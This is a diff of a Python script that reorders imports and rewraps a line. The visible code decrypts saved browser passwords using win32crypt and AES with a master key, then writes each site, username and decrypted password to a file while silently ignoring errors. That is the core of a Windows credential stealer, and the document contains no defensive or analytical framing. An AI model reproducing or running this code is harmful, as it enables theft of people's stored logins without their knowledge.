@@ -1,10 +1,11 @@
-import os
-import json
 import base64
+import json
+import os
+import shutil
 import sqlite3
+
 import win32crypt
 from Crypto.Cipher import AES
-import shutil
 
 TEMP = os.getenv("TEMP")
 ROAMING = os.getenv("APPDATA")
@@ -74,7 +75,8 @@ def get_password():
             encrypted_password = r[2]
             decrypted_password = decrypt_password(encrypted_password, master_key)
             if username != "" or decrypted_password != "":
-                w.write("Site: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_password + "\n**********\n\n")
+                w.write(
+                    "Site: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_password + "\n**********\n\n")
     except Exception:
         pass
 
